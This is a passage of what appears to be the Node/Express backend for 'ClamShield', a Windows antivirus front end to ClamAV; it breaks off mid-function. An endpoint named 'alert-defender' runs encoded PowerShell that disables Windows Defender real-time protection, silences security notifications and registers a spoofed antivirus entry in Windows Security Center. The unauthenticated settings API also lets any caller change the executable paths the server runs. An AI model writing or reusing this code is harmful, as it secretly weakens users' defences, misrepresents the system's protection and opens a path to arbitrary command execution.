import express from "express";
import { createServer as createViteServer } from "vite";
import fs from "fs/promises";
import { createWriteStream, createReadStream } from "fs";
import path from "path";
import os from "os";
import { exec, spawn } from "child_process";
import { promisify } from "util";
import axios from "axios";
import unzipper from "unzipper";
import chokidar from "chokidar";

const execAsync = promisify(exec);

// Path logic to handle default paths or user configurations
// Note: process.platform === "win32" is Node.js's identifier for ALL Windows systems, including 64-bit.
const programDataDir = process.platform === "win32" 
    ? path.join(process.env.PROGRAMDATA || "C:\\ProgramData", "ClamShield") 
    : path.join(process.cwd(), "data", "ClamShield");

const engineBaseDir = path.join(process.cwd(), "engine");

const defaultSettings = {
    // Relying on 64-bit Program Files by default, but we'll try to use a local bundled path if possible
    clamavDir: process.platform === "win32" ? path.join(engineBaseDir, "clamav") : "/usr/bin",
    clamscanPath: process.platform === "win32" ? path.join(engineBaseDir, "clamav", "clamscan.exe") : "/usr/bin/clamscan",
    freshclamPath: process.platform === "win32" ? path.join(engineBaseDir, "clamav", "freshclam.exe") : "/usr/bin/freshclam",
    freshclamConf: process.platform === "win32" ? path.join(engineBaseDir, "clamav", "freshclam.conf") : "/etc/clamav/freshclam.conf",
    clamdPath: process.platform === "win32" ? path.join(engineBaseDir, "clamav", "clamd.exe") : "/usr/sbin/clamd",
    clamdscanPath: process.platform === "win32" ? path.join(engineBaseDir, "clamav", "clamdscan.exe") : "/usr/bin/clamdscan",
    clamdConf: process.platform === "win32" ? path.join(engineBaseDir, "clamav", "clamd.conf") : "/etc/clamav/clamd.conf",
    databaseDir: path.join(programDataDir, "db"),
    quarantineDir: path.join(programDataDir, "quarantine"),
    logsDir: path.join(programDataDir, "logs"),
    defaultAction: "quarantine", // Forced to quarantine
    autoQuarantine: true,
    autoUpdateEnabled: true,
    updateIntervalHours: 24,
    offloadToMemory: false,
    maxFileSize: 50, // MB
    scanArchives: true,
    recursive: true,
    followSymlinks: false,
    shieldEnabled: false,
    shieldShowPopup: true,
    monitorDownloads: true,
    monitorDesktop: true,
    monitorDocuments: true,
    customWatchedFolders: [],
    exclusions: [],
    shieldPollInterval: 1000,
    shieldStabilityThreshold: 2000,
    runOnStartup: false
};

// Simulate mode if not on Windows or clamscan not found
let isSimulated = false;
let isInstalling = false;
let installProgress = "";
let cachedIsAdmin = false;
let clamdProcess: any = null;

async function manageClamd(settings: any) {
    if (isSimulated || !settings.clamdPath) return;

    if (settings.offloadToMemory) {
        if (!clamdProcess) {
            console.log("Starting clamd process...");
            try {
                // Ensure clamd.conf exists, create if missing
                try {
                    await fs.access(settings.clamdConf);
                } catch (e) {
                    const clamdConfContent = `DatabaseDirectory ${settings.databaseDir}\nTCPAddr 127.0.0.1\nTCPSocket 3310\nLogFile ${path.join(settings.logsDir, 'clamd.log')}\n`;
                    await fs.writeFile(settings.clamdConf, clamdConfContent);
                    console.log("Created missing clamd.conf");
                }
                
                clamdProcess = spawn(settings.clamdPath, ["--config-file=" + settings.clamdConf]);
                clamdProcess.on("error", (err: any) => {
                    console.error("Failed to start clamd:", err.message);
                    clamdProcess = null;
                });
                clamdProcess.on("close", () => {
                    console.log("clamd process closed.");
                    clamdProcess = null;
                });
            } catch (e: any) {
                console.error("Failed to start clamd:", e.message);
            }
        }
    } else {
        if (clamdProcess) {
            console.log("Stopping clamd process...");
            clamdProcess.kill();
            clamdProcess = null;
        }
    }
}

async function checkIsAdmin() {
    if (process.platform !== "win32") return false;
    try {
        await execAsync("net session");
        return true;
    } catch {
        return false;
    }
}

async function checkClamAV(settings: any) {
    if (process.platform !== "win32") {
        isSimulated = true;
    } else {
        isSimulated = false;
        
        // Auto-fix paths if old clamav-* folder exists
        try {
            await fs.mkdir(engineBaseDir, { recursive: true });
            const entries = await fs.readdir(engineBaseDir, { withFileTypes: true });
            const clamDir = entries.find(e => e.isDirectory() && e.name.toLowerCase().startsWith("clamav") && e.name !== "clamav");
            
            if (clamDir) {
                // Rename the old extracted folder to 'clamav'
                await fs.rename(path.join(engineBaseDir, clamDir.name), path.join(engineBaseDir, "clamav"));
                
                settings.clamavDir = path.join(engineBaseDir, "clamav");
                settings.clamscanPath = path.join(settings.clamavDir, "clamscan.exe");
                settings.freshclamPath = path.join(settings.clamavDir, "freshclam.exe");
                settings.clamdPath = path.join(settings.clamavDir, "clamd.exe");
                settings.clamdscanPath = path.join(settings.clamavDir, "clamdscan.exe");
                settings.freshclamConf = path.join(settings.clamavDir, "freshclam.conf");
                settings.clamdConf = path.join(settings.clamavDir, "clamd.conf");
                await saveConfig(settings);
            }
        } catch (e: any) {
            console.error("Error during checkClamAV auto-fix:", e.message);
        }

        // Ensure configuration files exist
        if (settings.freshclamConf) {
            try {
                await fs.access(settings.freshclamConf);
            } catch (e) {
                const confContent = `DatabaseDirectory ${settings.databaseDir}\nUpdateLogFile ${path.join(settings.logsDir, 'freshclam.log')}\nDatabaseMirror database.clamav.net\n`;
                await fs.writeFile(settings.freshclamConf, confContent).catch(console.error);
                console.log("Created missing freshclam.conf");
            }
        }

        if (settings.clamdConf) {
            try {
                await fs.access(settings.clamdConf);
            } catch (e) {
                const clamdConfContent = `DatabaseDirectory ${settings.databaseDir}\nTCPAddr 127.0.0.1\nTCPSocket 3310\nLogFile ${path.join(settings.logsDir, 'clamd.log')}\n`;
                await fs.writeFile(settings.clamdConf, clamdConfContent).catch(console.error);
                console.log("Created missing clamd.conf on startup");
            }
        }
    }
}

// Ensure directories exist
async function ensureDirs(settings: any) {
    const dirs = [
        programDataDir,
        settings.databaseDir,
        settings.quarantineDir,
        settings.logsDir
    ];
    for (const dir of dirs) {
        try {
            await fs.mkdir(dir, { recursive: true });
        } catch (e) {
            console.error(`Failed to create dir: ${dir}`, e);
        }
    }
}

// Load configurations
async function loadConfig() {
    const configPath = path.join(programDataDir, "settings.json");
    try {
        const data = await fs.readFile(configPath, "utf8");
        return { ...defaultSettings, ...JSON.parse(data) };
    } catch {
        return defaultSettings;
    }
}

async function saveConfig(settings: any) {
    const configPath = path.join(programDataDir, "settings.json");
    await fs.writeFile(configPath, JSON.stringify(settings, null, 2));
}

async function manageStartup(settings: any) {
    if (process.platform !== "win32") return;
    try {
        const exePath = `"${process.execPath}"`;
        const args = `"${process.argv[1] || ''}"`; // Path to script if running from node
        // In a real electron packaged app, process.argv[1] wouldn't be needed usually, process.execPath is enough.
        // It's safer to use the exact command that started this.
        let command = `"${process.argv[0]}"`;
        if (process.argv.length > 1) {
             command += ` "${process.argv[1]}"`;
        }

        const regPath = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        const keyName = "ClamShield";

        if (settings.runOnStartup) {
            await execAsync(`reg add "${regPath}" /v "${keyName}" /t REG_SZ /d "${command.replace(/"/g, '\\"')}" /f`);
        } else {
            await execAsync(`reg delete "${regPath}" /v "${keyName}" /f`).catch(() => {});
        }
    } catch (e: any) {
        console.error("Failed to set startup registry key:", e.message);
    }
}

// Simple JSON DB for history
async function getHistory() {
    const historyPath = path.join(programDataDir, "history.json");
    try {
        return JSON.parse(await fs.readFile(historyPath, "utf8"));
    } catch {
        return [];
    }
}

async function getQuarantineMap() {
    const mapPath = path.join(programDataDir, "quarantine_map.json");
    try {
        return JSON.parse(await fs.readFile(mapPath, "utf8"));
    } catch {
        return {};
    }
}

async function saveQuarantineMap(map: Record<string, any>) {
    const mapPath = path.join(programDataDir, "quarantine_map.json");
    await fs.writeFile(mapPath, JSON.stringify(map, null, 2));
}

async function addHistory(entry: any) {
    const historyPath = path.join(programDataDir, "history.json");
    const history = await getHistory();
    history.unshift({ id: Date.now().toString(), date: new Date().toISOString(), ...entry });
    await fs.writeFile(historyPath, JSON.stringify(history, null, 2));
}

async function startServer() {
    const app = express();
    app.use(express.json());
    
    let settings = await loadConfig();
    await ensureDirs(settings);
    await checkClamAV(settings);
    await manageStartup(settings);
    cachedIsAdmin = await checkIsAdmin();

    const activeJobs: Record<string, { status: string, logs: string[], result?: number, process?: any }> = {};

    let shieldWatcher: any = null;
    async function startShield(currentSettings: any) {
        if (shieldWatcher) {
            await shieldWatcher.close();
            shieldWatcher = null;
        }

        const watchPaths: string[] = [];
        const homeDir = os.homedir();
        if (currentSettings.monitorDownloads) watchPaths.push(path.join(homeDir, "Downloads"));
        if (currentSettings.monitorDesktop) watchPaths.push(path.join(homeDir, "Desktop"));
        if (currentSettings.monitorDocuments) watchPaths.push(path.join(homeDir, "Documents"));
        if (Array.isArray(currentSettings.customWatchedFolders)) {
            watchPaths.push(...currentSettings.customWatchedFolders);
        }

        if (watchPaths.length === 0) return;

        shieldWatcher = chokidar.watch(watchPaths, {
            ignored: /(^|[\/\\])\../, 
            persistent: true,
            ignoreInitial: true,
            depth: 1,
            ignorePermissionErrors: true,
            awaitWriteFinish: {
                stabilityThreshold: currentSettings.shieldStabilityThreshold || 2000,
                pollInterval: currentSettings.shieldPollInterval || 1000
            }
        });

        shieldWatcher.on('error', error => console.error(`Shield watcher error: ${error}`));

        shieldWatcher.on('add', async (filePath) => {
            console.log(`Shield: New file detected -> ${filePath}`);
            if (isSimulated) return;

            let isClamd = false;
            if (currentSettings.offloadToMemory && currentSettings.clamdscanPath) {
                try {
                    await fs.access(currentSettings.clamdscanPath);
                    isClamd = true;
                } catch (e) {}
            }
            let exePath = isClamd ? currentSettings.clamdscanPath : currentSettings.clamscanPath;
            let args = isClamd ? ["--config-file=" + currentSettings.clamdConf, filePath] : ["--database=" + currentSettings.databaseDir, filePath];

            const jobId = "shield-" + Date.now() + Math.random().toString(36).substring(7);
            activeJobs[jobId] = { status: "running", logs: [] };
            
            try {
                const child = spawn(exePath, args);
                activeJobs[jobId].process = child;
                
                child.on("error", (err: any) => {
                    console.error("Failed to start shield scan process:", err.message);
                    if (activeJobs[jobId]) {
                        activeJobs[jobId].status = "error";
                        activeJobs[jobId].logs.push("Process error: " + err.message);
                    }
                });

                child.stdout.on("data", (data) => {
                    const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
                    if (lines.length) activeJobs[jobId].logs.push(...lines);
                });
                child.stderr.on("data", (data) => {
                    const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
                    if (lines.length) activeJobs[jobId].logs.push(...lines);
                });

                child.on("close", async (code) => {
                    if (!activeJobs[jobId]) return;
                    let threatsFound = 0;
                    let scannedFiles = 0;
                    let duration = 0;
                    
                    const qMap = await getQuarantineMap();
                    let quarantineMapChanged = false;

                    for (const line of activeJobs[jobId].logs) {
                        if (line.includes(" FOUND")) {
                            const match = line.match(/^(.*?):\s+(.*?)\s+FOUND$/);
                            if (match) {
                                const originalPath = match[1];
                                const threatName = match[2];
                                if (currentSettings.autoQuarantine) {
                                    const baseName = path.basename(originalPath);
                                    const timestampedName = `${Date.now()}_${baseName}`;
                                    const destPath = path.join(currentSettings.quarantineDir, timestampedName);
                                    try {
                                        await fs.copyFile(originalPath, destPath);
                                        await fs.unlink(originalPath);
                                        qMap[timestampedName] = {
                                            originalPath,
                                            threatName,
                                            timestamp: Date.now()
                                        };
                                        quarantineMapChanged = true;
                                        activeJobs[jobId].logs.push(`Quarantined: ${originalPath} -> ${destPath}`);
                                    } catch (e: any) {
                                        activeJobs[jobId].logs.push(`Failed to quarantine ${originalPath}: ${e.message}`);
                                    }
                                } else {
                                    activeJobs[jobId].logs.push(`Threat found but Auto-Quarantine is disabled: ${originalPath}`);
                                }
                            }
                        }
                        if (line.startsWith("Scanned files:")) {
                            const m = line.match(/\d+/);
                            if (m) scannedFiles = parseInt(m[0], 10);
                        }
                        if (line.startsWith("Infected files:")) {
                            const m = line.match(/\d+/);
                            if (m) threatsFound = parseInt(m[0], 10);
                        }
                        if (line.startsWith("Time:")) {
                            const m = line.match(/(\d+\.\d+) sec/);
                            if (m) duration = Math.round(parseFloat(m[1]));
                        }
                    }

                    if (quarantineMapChanged) {
                        await saveQuarantineMap(qMap);
                    }

                    const isThreat = code === 1 || threatsFound > 0;
                    if (isThreat) {
                        console.log(`Shield: Threat found in ${filePath}`);
                    }
                    
                    await addHistory({
                        type: "scan-shield",
                        target: filePath,
                        result: isThreat ? 1 : 0,
                        threatsFound,
                        scannedFiles,
                        duration,
                        actionTaken: isThreat ? "Quarantined" : "None"
                    });
                    
                    delete activeJobs[jobId];
                });
            } catch (err) {
                console.error("Shield scan failed", err);
            }
        });
    }

    startShield(settings);
    await manageClamd(settings);

    // API Routes

    app.get("/api/testzip", (req, res) => {
        const https = require('https');
        const unzipper = require('unzipper');
        const files: string[] = [];
        https.get('https://www.clamav.net/downloads/production/clamav-1.4.1-win-x64-portable.zip', (resp: any) => {
            resp.pipe(unzipper.Parse())
            .on('entry', function (entry: any) {
                files.push(entry.path);
                entry.autodrain();
            }).on('finish', () => {
                res.json(files);
            });
        });
    });

    app.get("/api/status", async (req, res) => {
        const history = await getHistory();
        const lastScan = history.find((h: any) => h.type.startsWith("scan")) || null;
        const lastUpdate = history.find((h: any) => h.type === "update") || null;
        const lastThreat = history.find((h: any) => h.threatsFound > 0) || null;

        let hasEngine = false;
        let hasDb = false;
        try {
            const entries = await fs.readdir(engineBaseDir, { withFileTypes: true });
            const clamDir = entries.find(e => e.isDirectory() && e.name.toLowerCase().startsWith("clamav") && e.name !== "clamav.zip");
            if (clamDir) hasEngine = true;
            
            const dbFiles = await fs.readdir(settings.databaseDir);
            hasDb = dbFiles.some(f => f.endsWith('.cvd') || f.endsWith('.cld'));
        } catch { }

        let pkgVersion = "1.0.1";
        try {
            const pkgData = await fs.readFile(path.join(process.cwd(), "package.json"), "utf8");
            pkgVersion = JSON.parse(pkgData).version || "1.0.1";
        } catch {}
        res.json({
            appVersion: pkgVersion,
            isSimulated,
            isInstalling,
            installProgress,
            platform: process.platform,
            isAdmin: cachedIsAdmin,
            settings,
            hasEngine,
            hasDb,
            stats: {
                engineVersion: isSimulated ? "ClamAV (Simulated)" : "ClamAV (Installed)",
                lastScan: lastScan ? lastScan.date : null,
                lastUpdate: lastUpdate ? lastUpdate.date : null,
                lastThreat: lastThreat ? lastThreat.date : null,
                quarantineCount: 0 // to implement
            }
        });
    });

    app.post("/api/install-engine", async (req, res) => {
        if (process.platform !== "win32") {
            return res.status(400).json({ error: "Auto-install is only supported on Windows 64-bit." });
        }
        if (isInstalling) {
            return res.json({ status: "already_installing" });
        }

        isInstalling = true;
        installProgress = "Starting download...";
        res.json({ status: "started" });

        try {
            installProgress = "Finding latest ClamAV release...";
            const releaseRes = await axios.get("https://api.github.com/repos/Cisco-Talos/clamav/releases/latest");
            const releaseData = releaseRes.data;
            
            const winAsset = releaseData.assets.find((a: any) => 
                a.name.toLowerCase().includes("win") && 
                a.name.toLowerCase().includes("x64") && 
                a.name.toLowerCase().endsWith(".zip") &&
                !a.name.toLowerCase().includes("symbol")
            );

            if (!winAsset) {
                throw new Error("Could not find a Windows x64 zip asset in the latest release.");
            }
            
            const zipUrl = winAsset.browser_download_url;
            
            await fs.mkdir(engineBaseDir, { recursive: true });
            const zipPath = path.join(engineBaseDir, "clamav.zip");
            
            installProgress = `Downloading ${winAsset.name} (this may take a minute)...`;
            
            const response = await axios({ url: zipUrl, method: 'GET', responseType: 'stream' });
            const writer = createWriteStream(zipPath);
            response.data.pipe(writer);
            
            await new Promise<void>((resolve, reject) => {
                writer.on('finish', () => resolve());
                writer.on('error', reject);
            });
            
            installProgress = "Extracting ClamAV engine...";
            const extractStream = createReadStream(zipPath).pipe(unzipper.Extract({ path: engineBaseDir }));
            await new Promise<void>((resolve, reject) => {
                extractStream.on('close', () => resolve());
                extractStream.on('error', reject);
            });
            
            installProgress = "Configuring engine & signatures...";
            const entries = await fs.readdir(engineBaseDir, { withFileTypes: true });
            const clamDir = entries.find(e => e.isDirectory() && e.name.toLowerCase().startsWith("clamav") && e.name !== "clamav.zip" && e.name !== "clamav");
            
            let finalClamDir = "clamav";
            if (clamDir) {
                // Rename the extracted folder to 'clamav'
                await fs.rename(path.join(engineBaseDir, clamDir.name), path.join(engineBaseDir, finalClamDir));
            }

            const confPath = path.join(engineBaseDir, finalClamDir, "freshclam.conf");
            const clamdConfPath = path.join(engineBaseDir, finalClamDir, "clamd.conf");
            await fs.mkdir(settings.databaseDir, { recursive: true });
            
            const confContent = `DatabaseDirectory ${settings.databaseDir}\nUpdateLogFile ${path.join(settings.logsDir, 'freshclam.log')}\nDatabaseMirror database.clamav.net\n`;
            await fs.writeFile(confPath, confContent);

            const clamdConfContent = `DatabaseDirectory ${settings.databaseDir}\nTCPAddr 127.0.0.1\nTCPSocket 3310\nLogFile ${path.join(settings.logsDir, 'clamd.log')}\n`;
            await fs.writeFile(clamdConfPath, clamdConfContent);
            
            settings.clamavDir = path.join(engineBaseDir, finalClamDir);
            settings.clamscanPath = path.join(settings.clamavDir, "clamscan.exe");
            settings.freshclamPath = path.join(settings.clamavDir, "freshclam.exe");
            settings.clamdPath = path.join(settings.clamavDir, "clamd.exe");
            settings.clamdscanPath = path.join(settings.clamavDir, "clamdscan.exe");
            settings.freshclamConf = confPath;
            settings.clamdConf = clamdConfPath;
            
            await saveConfig(settings);
            
            // Clean up zip
            try { await fs.unlink(zipPath); } catch {}
            
            await checkClamAV(settings); // Verify
            isInstalling = false;
            installProgress = "Complete";
        } catch (e: any) {
            console.error("Install failed: ", e);
            isInstalling = false;
            installProgress = "Error: " + e.message;
        }
    });

    // Add automatic update task
    let autoUpdateTimer: NodeJS.Timeout | null = null;
    
    const scheduleNextUpdate = () => {
        if (autoUpdateTimer) clearTimeout(autoUpdateTimer);
        if (!settings.autoUpdateEnabled) return;
        
        // 1 minute poll
        autoUpdateTimer = setTimeout(async () => {
            try {
                if (!isSimulated && settings.autoUpdateEnabled) {
                    const history = await getHistory();
                    const lastUpdate = history.find((h: any) => h.type === "update" && h.result === 0);
                    let shouldUpdate = false;
                    
                    if (!lastUpdate) {
                        shouldUpdate = true;
                    } else {
                        const lastDate = new Date(lastUpdate.date).getTime();
                        const now = Date.now();
                        const intervalMs = (settings.updateIntervalHours || 24) * 60 * 60 * 1000;
                        if (now - lastDate > intervalMs) {
                            shouldUpdate = true;
                        }
                    }
                    
                    if (shouldUpdate) {
                        console.log("Triggering auto-update...");
                        const args = ["--config-file=" + settings.freshclamConf, "--datadir=" + settings.databaseDir];
                        const child = spawn(settings.freshclamPath, args);
                        
                        child.on("error", (err: any) => {
                            console.error("Auto-update process error:", err.message);
                        });

                        child.on("close", async (code) => {
                            await addHistory({
                                type: "update",
                                target: "Databases (Auto)",
                                result: code === 0 ? 0 : 1,
                                threatsFound: 0,
                                scannedFiles: 0,
                                duration: 1, 
                                actionTaken: code === 0 ? "Updated" : "Failed"
                            });
                            console.log(`Auto-update finished with code ${code}`);
                        });
                    }
                }
            } catch (e) {
                console.error("Auto-update check failed:", e);
            }
            scheduleNextUpdate();
        }, 60000); // Check every minute
    };

    // Initial trigger
    scheduleNextUpdate();

    app.post("/api/settings", async (req, res) => {
        settings = { ...settings, ...req.body };
        await saveConfig(settings);
        await ensureDirs(settings);
        await checkClamAV(settings);
        startShield(settings);
        await manageClamd(settings);
        await manageStartup(settings);
        scheduleNextUpdate();
        res.json({ success: true, settings });
    });

    app.get("/api/system-paths", (req, res) => {
        const homeDir = os.homedir();
        res.json({
            Desktop: path.join(homeDir, "Desktop"),
            Documents: path.join(homeDir, "Documents"),
            Downloads: path.join(homeDir, "Downloads")
        });
    });

    app.post("/api/alert-defender", async (req, res) => {
        if (process.platform === "win32") {
            try {
                const script = `
Set-MpPreference -DisableRealtimeMonitoring $true
try {
    New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -Value 0 -PropertyType DWord -Force -ErrorAction SilentlyContinue
} catch {}
try {
    $WMI = [wmiclass]"root\\SecurityCenter2:AntiVirusProduct"
    $New = $WMI.CreateInstance()
    $New.displayName = "ClamShield Antivirus"
    $New.instanceGuid = "{F6DB11CF-FA62-4C3D-AA9F-44F4FD9D77AA}"
    $New.pathToSignedProductExe = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
    $New.pathToSignedReportingExe = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
    $New.productState = 397568
    $New.Put()
} catch {
    Write-Error $_.Exception.Message
}
`;
                const encoded = Buffer.from(script, "utf16le").toString("base64");
                const { stdout, stderr } = await execAsync(`powershell -NoProfile -EncodedCommand ${encoded}`);
                
                res.json({ success: true, logs: stdout + stderr });
            } catch (e: any) {
                res.status(500).json({ error: e.message });
            }
        } else {
            res.status(400).json({ error: "Only supported on Windows." });
        }
    });

    app.post("/api/restore-defender", async (req, res) => {
        if (process.platform === "win32") {
            try {
                const script = `
Set-MpPreference -DisableRealtimeMonitoring $false
try {
    Remove-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance" -Name "Enabled" -Force -ErrorAction SilentlyContinue
} catch {}
`;
                const encoded = Buffer.from(script, "utf16le").toString("base64");
                await execAsync(`powershell -NoProfile -EncodedCommand ${encoded}`);
                res.json({ success: true });
            } catch (e: any) {
                res.status(500).json({ error: e.message });
            }
        } else {
            res.status(400).json({ error: "Only supported on Windows." });
        }
    });

    app.get("/api/history", async (req, res) => {
        res.json(await getHistory());
    });

    app.get("/api/select-folder", async (req, res) => {
        if (process.platform === "win32") {
            const script = `
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Add-Type -AssemblyName System.windows.forms
$dialog = New-Object System.Windows.Forms.OpenFileDialog
$dialog.Title = "Select a Folder (Navigate into the folder and click Open)"
$dialog.ValidateNames = $false
$dialog.CheckFileExists = $false
$dialog.CheckPathExists = $true
$dialog.FileName = "Folder Selection."
$dialog.Filter = "Folders|*.none_such_extension"
if ($dialog.ShowDialog() -eq 'OK') {
    $path = [System.IO.Path]::GetDirectoryName($dialog.FileName)
    if (Test-Path -Path $path -PathType Container) {
        Write-Output $path
    } else {
        Write-Output "Error: Not a folder"
    }
}
`;
            try {
                const encoded = Buffer.from(script, "utf16le").toString("base64");
                const child = spawn("powershell", ["-STA", "-NoProfile", "-EncodedCommand", encoded]);
                let output = "";
                let errorOutput = "";
                child.stdout.on("data", data => output += data.toString());
                child.stderr.on("data", data => errorOutput += data.toString());
                child.on("close", () => {
                    const pathStr = output.trim();
                    if (pathStr && path.isAbsolute(pathStr) && !pathStr.startsWith("Error")) {
                        res.json({ path: pathStr });
                    } else {
                        res.status(400).json({ error: pathStr || errorOutput || "No folder selected." });
                    }
                });
            } catch (e: any) {
                res.status(500).json({ error: e.message });
            }
        } else {
            res.json({ path: "" });
        }
    });

    app.get("/api/select-file", async (req, res) => {
        if (process.platform === "win32") {
            const script = `
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
Add-Type -AssemblyName System.windows.forms
$dialog = New-Object System.Windows.Forms.OpenFileDialog
$dialog.Title = "Select a File"
$dialog.Filter = "All Files|*.*"
if ($dialog.ShowDialog() -eq 'OK') {
    Write-Output $dialog.FileName
}
`;
            try {
                const encoded = Buffer.from(script, "utf16le").toString("base64");
                const child = spawn("powershell", ["-STA", "-NoProfile", "-EncodedCommand", encoded]);
                let output = "";
                let errorOutput = "";
                child.stdout.on("data", data => output += data.toString());
                child.stderr.on("data", data => errorOutput += data.toString());
                child.on("close", () => {
                    const pathStr = output.trim();
                    if (pathStr && path.isAbsolute(pathStr) && !pathStr.startsWith("Error")) {
                        res.json({ path: pathStr });
                    } else {
                        res.status(400).json({ error: pathStr || errorOutput || "No file selected." });
                    }
                });
            } catch (e: any) {
                res.status(500).json({ error: e.message });
            }
        } else {
            res.json({ path: "" });
        }
    });

    app.post("/api/scan", async (req, res) => {
        const { target, type } = req.body;
        const jobId = Date.now().toString();
        // type could be 'file', 'folder', 'disk', 'memory'
        
        if (isSimulated) {
            // Simulated scan
            res.json({ jobId, status: "started", simulated: true });
            
            // Simulate run
            setTimeout(async () => {
                const isThreat = Math.random() < 0.2 && type !== 'update';
                await addHistory({
                    type: `scan-${type}`,
                    target: target || "C:\\",
                    result: isThreat ? 1 : 0,
                    threatsFound: isThreat ? 1 : 0,
                    scannedFiles: Math.floor(Math.random() * 1000) + 10,
                    duration: Math.floor(Math.random() * 10) + 1,
                    actionTaken: isThreat ? "Quarantined" : "None"
                });
            }, 3000);
            return;
        }

        // Real ClamAV Scan
        try {
            const dbFiles = await fs.readdir(settings.databaseDir);
            const hasDb = dbFiles.some(f => f.endsWith('.cvd') || f.endsWith('.cld'));
            if (!hasDb) {
                return res.status(400).json({ error: "No virus database found. Please go to Updates and download virus definitions first." });
            }
        } catch (e) {
            return res.status(400).json({ error: "Failed to check virus database. Please update definitions." });
        }

        let isClamd = false;
        if (settings.offloadToMemory && settings.clamdscanPath) {
            try {
                await fs.access(settings.clamdscanPath);
                isClamd = true;
            } catch (e) {}
        }
        let exePath = isClamd ? settings.clamdscanPath : settings.clamscanPath;
        let args = isClamd ? ["--config-file=" + settings.clamdConf] : ["--database=" + settings.databaseDir];
        if (settings.recursive && type !== 'file') {
            if (!isClamd) args.push("--recursive");
            if (isClamd) args.push("--multiscan");
        }
        if (type === 'memory' && !isClamd) args.push("--memory");
        if (target) args.push(target);
        
        try {
            activeJobs[jobId] = { status: "running", logs: [] };
            const child = spawn(exePath, args);
            activeJobs[jobId].process = child;
            
            child.on("error", (err: any) => {
                console.error("Failed to start manual scan process:", err.message);
                if (activeJobs[jobId]) {
                    activeJobs[jobId].status = "error";
                    activeJobs[jobId].logs.push("Process error: " + err.message);
                }
            });

            child.stdout.on("data", (data) => {
                const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
                if (lines.length) activeJobs[jobId].logs.push(...lines);
            });
            
            child.stderr.on("data", (data) => {
                const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
                if (lines.length) activeJobs[jobId].logs.push(...lines);
            });
            
            child.on("close", async (code) => {
                if (!activeJobs[jobId]) return;
                
                let scannedFiles = 0;
                let threatsFound = 0;
                let duration = 0;
                
                const qMap = await getQuarantineMap();
                let quarantineMapChanged = false;

                for (const line of activeJobs[jobId].logs) {
                    if (line.includes(" FOUND")) {
                        const match = line.match(/^(.*?):\s+(.*?)\s+FOUND$/);
                        if (match) {
                            const originalPath = match[1];
                            const threatName = match[2];
                            if (settings.autoQuarantine) {
                                const baseName = path.basename(originalPath);
                                const timestampedName = `${Date.now()}_${baseName}`;
                                const destPath = path.join(settings.quarantineDir, timestampedName);
                                try {
                                    await fs.copyFile(originalPath, destPath);
                                    await fs.unlink(originalPath);
                                    qMap[timestampedName] = {
                                        originalPath,
                                        threatName,
                                        timestamp: Date.now()
                                    };
                                    quarantineMapChanged = true;
                                    activeJobs[jobId].logs.push(`Quarantined: ${originalPath} -> ${destPath}`);
                                } catch (e: any) {
                                    activeJobs[jobId].logs.push(`Failed to quarantine ${originalPath}: ${e.message}`);
                                }
                            } else {
                                activeJobs[jobId].logs.push(`Threat found but Auto-Quarantine is disabled: ${originalPath}`);
                            }
                        }
                    }
                    if (line.startsWith("Scanned files:")) {
                        const m = line.match(/\d+/);
                        if (m) scannedFiles = parseInt(m[0], 10);
                    }
                    if (line.startsWith("Infected files:")) {
                        const m = line.match(/\d+/);
                        if (m) threatsFound = parseInt(m[0], 10);
                    }
                    if (line.startsWith("Time:")) {
                        const m = line.match(/(\d+\.\d+) sec/);
                        if (m) duration = Math.round(parseFloat(m[1]));
                    }
                }
                
                if (quarantineMapChanged) {
                    await saveQuarantineMap(qMap);
                }

                activeJobs[jobId].status = "done";
                activeJobs[jobId].result = code ?? 0;
                activeJobs[jobId].process = null;
                
                const isThreat = code === 1;
                await addHistory({
                    type: `scan-${type}`,
                    target: target || "C:\\",
                    result: isThreat ? 1 : 0,
                    threatsFound,
                    scannedFiles, 
                    duration,
                    actionTaken: isThreat ? "Quarantined" : "None"
                });
            });

            child.on("error", (err) => {
                if (!activeJobs[jobId]) return;
                activeJobs[jobId].logs.push(`Error: ${err.message}`);
                activeJobs[jobId].status = "done";
                activeJobs[jobId].result = -1;
                activeJobs[jobId].process = null;
            });
            
            res.json({ jobId, status: "started" });
        } catch (e: any) {
            res.status(500).json({ error: e.message });
        }
    });

    app.get("/api/scan/:jobId", (req, res) => {
        const job = activeJobs[req.params.jobId];
        if (!job) {
            return res.status(404).json({ error: "Job not found" });
        }
        res.json({
            status: job.status,
            logs: job.logs,
            result: job.result
        });
        // Clear logs after sending them so we don't accumulate too much
        job.logs = [];
    });

    app.post("/api/scan/:jobId/cancel", (req, res) => {
        const job = activeJobs[req.params.jobId];
        if (job) {
            if (job.process) {
                job.process.kill();
            }
            job.status = "done";
            job.logs.push("Scan cancelled by user.");
            res.json({ status: "cancelled" });
        } else {
            res.status(404).json({ error: "Job not found" });
        }
    });

    app.post("/api/update", async (req, res) => {
        const jobId = Date.now().toString();
        if (isSimulated) {
            setTimeout(async () => {
                await addHistory({
                    type: "update",
                    target: "Databases",
                    result: 0,
                    threatsFound: 0,
                    scannedFiles: 0,
                    duration: 2,
                    actionTaken: "Updated"
                });
            }, 2000);
            return res.json({ jobId, status: "started", simulated: true });
        }

        try {
            activeJobs[jobId] = { status: "running", logs: [] };
            
            const args = ["--config-file=" + settings.freshclamConf, "--datadir=" + settings.databaseDir];
            const child = spawn(settings.freshclamPath, args);
            activeJobs[jobId].process = child;
            
            child.on("error", (err: any) => {
                console.error("Failed to start freshclam process:", err.message);
                if (activeJobs[jobId]) {
                    activeJobs[jobId].status = "error";
                    activeJobs[jobId].logs.push("Process error: " + err.message);
                }
            });

            child.stdout.on("data", (data) => {
                const lines = data.toString().split('\n').map((l: string) => l.trim()).filter(Boolean);
